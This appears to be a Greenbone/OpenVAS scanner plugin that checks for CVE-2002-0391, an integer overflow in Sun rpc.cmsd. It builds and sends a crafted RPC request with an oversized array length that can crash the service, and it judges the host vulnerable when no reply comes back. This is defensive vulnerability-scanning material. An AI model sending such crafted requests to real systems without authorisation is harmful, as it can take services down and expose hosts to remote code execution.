# SPDX-FileCopyrightText: 2003 Xue Yong Zhi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11418");
  script_version("2024-02-09T05:06:25+0000");
  script_tag(name:"last_modification", value:"2024-02-09 05:06:25 +0000 (Fri, 09 Feb 2024)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-02-08 18:38:00 +0000 (Thu, 08 Feb 2024)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5356");
  script_cve_id("CVE-2002-0391");
  script_name("Sun rpc.cmsd Overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2003 Xue Yong Zhi");
  script_family("General");
  script_dependencies("gb_rpc_portmap_udp_detect.nasl", "gb_rpc_portmap_tcp_detect.nasl");
  script_mandatory_keys("rpc/portmap/tcp_or_udp/detected");

  script_tag(name:"solution", value:"We suggest that you disable this service and apply a new patch.");

  script_tag(name:"summary", value:"The remote Sun rpc.cmsd has integer overflow problem in xdr_array. An attacker
  may use this flaw to execute arbitrary code on this host with the privileges rpc.cmsd is running as (typically, root),
  by sending a specially crafted request to this service.");

  script_tag(name:"affected", value:"Sun Solaris 8 is known to be affected. Other versions or
  products might be affected as well.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_analysis"); # rpc.cmsd is started from inetd

  exit(0);
}

# Data structure of cms_create_args(maybe wrong)
# struct cms_pid_t {
#       long pid;
# };
# struct cms_create_args {
#       char *str1;
#       char *str2;
#       struct cms_pid_t mypid;
#       struct {
#               u_int myarray_len;
#               long *myarray_val;
#       } myarray;
# };
#
# Successfully tested against Solaris 8

include("rpc.inc");
include("nfs_func.inc");
include("byte_func.inc");

RPC_PROG = 100068;
tcp = FALSE;
port = rpc_get_port(program:RPC_PROG, protocol:IPPROTO_UDP);
if(!port){
  port = rpc_get_port(program:RPC_PROG, protocol:IPPROTO_TCP);
  tcp = TRUE;
}

if(port) {
  if(tcp)
    soc = open_sock_tcp(port);
  else
    soc = open_sock_udp(port);

  if(!soc)
    exit(0);

  pad = padsz(len:strlen(this_host_name()));
  len = 20 + strlen(this_host_name()) + pad;

  # nb: First, make sure there is a RPC service running behind, so we send a bogus request to get an error back
  req1 = rpclong(val:rand()) +
         rpclong(val:0) +
         rpclong(val:2) +
         rpclong(val:100070) +
         rpclong(val:4) +
         rpclong(val:21);

  send(socket:soc, data:req1);
  r = recv(socket:soc, length:4096);
  close(soc);
  if(!r)
    exit(0);

  if(tcp) {
    proto = "tcp";
    soc = open_sock_tcp(port);
  } else {
    proto = "udp";
    soc = open_sock_udp(port);
  }

  if(!soc)
    exit(0);

  req = rpclong(val:rand()) +           #unsigned int xid;
        rpclong(val:0) +                #msg_type mtype case CALL(0):
        rpclong(val:2) +                #unsigned int rpcvers;/* must be equal to two (2) */
        rpclong(val:100068) +           #unsigned int prog(CMSD);
        rpclong(val:4) +                #unsigned int vers(4);
        rpclong(val:21) +               #unsigned int proc(rtable_create_4);
        rpclong(val:1) +                #AUTH_UNIX
        rpclong(val:len) +              #len
        rpclong(val:rand()) +           #stamp
        rpclong(val:strlen(this_host_name())) + #length
        this_host_name() +              #contents(Machine name)
        rpcpad(pad:pad) +               #fill bytes
        rpclong(val:0)  +               #uid
        rpclong(val:0)  +               #gid
        rpclong(val:0)  +               #auxiliary gids
        rpclong(val:0)  +               #AUTH_NULL
        rpclong(val:0)  +               #len
        rpclong(val:1)  +               #strlen of str1
        rpclong(val:67)  +              #str1
        rpclong(val:1)  +               #strlen of str2
        rpclong(val:67)  +              #str2
        rpclong(val:0)  +               #pid
        rpclong(val:1073741825) +       #array size
        rpclong(val:0)  +               #content of array(this one and below)
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0);

  send(socket:soc, data:req);
  r = recv(socket:soc, length:4096);
  close(soc);
  if(!r) {
    security_message(port:port, proto:proto);
  }
}
